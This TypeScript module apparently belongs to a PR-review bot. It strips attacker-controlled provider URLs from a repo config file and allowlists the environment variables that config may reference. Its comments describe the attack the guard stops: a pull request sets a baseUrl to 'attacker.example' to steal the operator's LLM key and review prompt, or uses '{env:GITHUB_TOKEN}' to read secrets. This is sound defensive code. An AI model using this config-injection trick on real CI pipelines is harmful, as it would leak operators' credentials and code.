/**
 * Strip PR-controlled network destinations from a config-file LLM provider map.
 *
 * `.opencode-reviewer.yml` is read from the PR branch, so every network
 * destination in it is attacker-controlled. A provider entry naming
 * `baseUrl: https://attacker.example/v1` survives `loadConfig` validation —
 * `baseUrl`, `endpoint` and `resourceName` are all on its allowlist — and
 * `mergeEnvProviderEntry` then fills the *operator's* `apiKey` into that same
 * entry, because it only overwrites keys the repo left unset. The result is the
 * operator's LLM key plus the entire review prompt (full diff and the contents
 * of every file the reviewer read) delivered to a host the PR author chose.
 *
 * The action path has always done this in `buildLLMConfig`. This module exists
 * so the app path can do the same thing from one implementation: the asymmetry
 * between the two wrappers is what let the app ship without a guard, and a
 * second hand-written copy is how that asymmetry would come back.
 */
import * as core from '@actions/core';
import type { LLMProviderConfig } from '../types/index.js';

/**
 * Allowlist of environment variable names that may be referenced from an LLM
 * provider config via the OpenCode `{env:VAR}` substitution syntax and
 * forwarded into the sandboxed OpenCode subprocess.
 *
 * The `llm:` block is repo-controlled, so without this allowlist a
 * compromised/third-party config could reference and exfiltrate an arbitrary
 * parent env var (e.g. `{env:GITHUB_TOKEN}`) into a subprocess that renders
 * repo content into prompts/logs. Only credential names relevant to the
 * supported LLM providers are forwarded; any other reference is skipped (with
 * a warning) and the CLI's `{env:VAR}` expansion would then yield an empty
 * value for that variable.
 *
 * NOTE: AWS_* names are intentionally excluded here. Bedrock credentials flow
 * via ambient forwarding in applyLLMEnvOverrides (Bedrock runs only), not via
 * `{env:}` references, so a `{env:AWS_REGION}` reference warns-and-skips by
 * design — Bedrock auth still works through the ambient path.
 */
export const LLM_REF_ALLOWLIST = new Set([
  'LLM_API_KEY',
  'LLM_BASE_URL',
  'LLM_MODEL',
  'OPENAI_API_KEY',
  'OPENCODE_API_KEY',
  'OLLAMA_API_KEY',
  'OLLAMA_BASE_URL',
  'OLLAMA_MODEL',
  'AZURE_OPENAI_API_KEY',
  'AZURE_OPENAI_ENDPOINT',
  'AZURE_RESOURCE_NAME',
  'AZURE_OPENAI_API_VERSION',
]);

/**
 * Check whether an `{env:VAR}` reference name may be resolved from the
 * operator's process environment.
 * @param name - Referenced variable name (without `{env:}`).
 * @returns True when the name is on {@link LLM_REF_ALLOWLIST}.
 */
export function isAllowedLLMEnvReference(name: string): boolean {
  return LLM_REF_ALLOWLIST.has(name);
}

/**
 * Drop `baseUrl` / `endpoint` / `resourceName` from every provider entry.
 *
 * Non-network fields (`type`, `model`, `models`, `apiKey`, `apiVersion`,
 * `deployment`, `modelId`, `region`, `npm`, timeouts) are preserved, so a repo
 * can still declare which model it wants to be reviewed with — only the
 * destination is operator-controlled.
 *
 * `apiKey` is preserved only when it is a literal value (the repo author's
 * own key material) or an `{env:VAR}` reference whose name is on
 * {@link LLM_REF_ALLOWLIST}. A non-allowlisted `{env:VAR}` reference is an
 * arbitrary reader of the operator's process environment, so it is dropped
 * (with a warning) at the source rather than left for consumers to reject.
 * @param providers - Provider map as parsed from the repo config file.
 * @param onWarn - Called once per provider that had a destination stripped.
 * @param onDisallowedApiKeyRef - Called once per provider whose `apiKey`
 * `{env:VAR}` reference was dropped for missing the allowlist.
 * @returns A new provider map, or `undefined` when the input is absent.
 */
export function stripUntrustedProviderEndpoints(
  providers: Record<string, LLMProviderConfig> | undefined,
  onWarn?: (providerId: string) => void,
  onDisallowedApiKeyRef?: (providerId: string, varName: string) => void,
): Record<string, LLMProviderConfig> | undefined {
  if (!providers || typeof providers !== 'object') return providers;

  const result: Record<string, LLMProviderConfig> = {};
  for (const [id, entry] of Object.entries(providers)) {
    if (!entry || typeof entry !== 'object') {
      if (entry !== undefined) result[id] = entry;
      continue;
    }
    const { baseUrl, endpoint, resourceName, ...rest } = entry as LLMProviderConfig & {
      baseUrl?: string;
      endpoint?: string;
      resourceName?: string;
    };
    if (baseUrl !== undefined || endpoint !== undefined || resourceName !== undefined) {
      onWarn?.(id);
    }
    // Split `apiKey` out so a disallowed reference can be dropped by omission
    // (no `delete` operator) while literals and allowlisted references are kept.
    const { apiKey, ...withoutApiKey } = rest as LLMProviderConfig & { apiKey?: unknown };
    const cleaned: LLMProviderConfig = { ...(withoutApiKey as LLMProviderConfig) };
    if (typeof apiKey === 'string') {
      const ref = /^\{env:([^}]+)\}$/.exec(apiKey.trim());
      if (ref && !isAllowedLLMEnvReference(ref[1])) {
        const varName = ref[1];
        if (onDisallowedApiKeyRef) {
          onDisallowedApiKeyRef(id, varName);
        } else {
          core.warning(
            `Dropping LLM provider "${id}" apiKey reference {env:${varName}}: "${varName}" is not on the allowlist of ` +
              `forwarded variables (${[...LLM_REF_ALLOWLIST].join(', ')}).`,
          );
        }
      } else {
        (cleaned as { apiKey?: unknown }).apiKey = apiKey;
      }
    }
    result[id] = cleaned;
  }
  return result;
}
